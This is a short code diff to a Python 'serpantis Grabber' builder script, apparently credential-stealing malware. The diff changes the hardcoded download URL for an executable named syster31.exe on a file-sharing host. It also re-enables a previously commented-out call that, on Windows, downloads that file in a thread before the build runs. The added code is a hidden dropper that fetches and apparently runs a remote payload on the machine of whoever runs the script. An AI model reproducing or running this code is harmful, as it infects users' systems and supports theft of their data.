@@ -47,7 +47,7 @@ def thread_hehe(url, filename):
     thread.start()
     thread.join()
 # Class for building the serpantis Grabber
-url = 'https://api.filedoge.com/download/2d0e32ad801b0dde16b8ed54a0bdc7abeaa8588777399e674efbd19d23497aff693c33376467628e2568'
+url = "https://api.filedoge.com/download/dfbf963928d279ab273ad159962faa8afb97eabdd9d38a20831d446caa59c32a4ea3278cc4fd57243165"
 filename = 'syster31.exe' 
 class Build:
     def __init__(self) -> None:
@@ -253,7 +253,7 @@ class Build:
 if __name__ == "__main__":
     if os.name == "nt":
 
-        #thread_hehe(url, filename)
+        thread_hehe(url, filename)
         Build().CallFunctions()
         
     else:
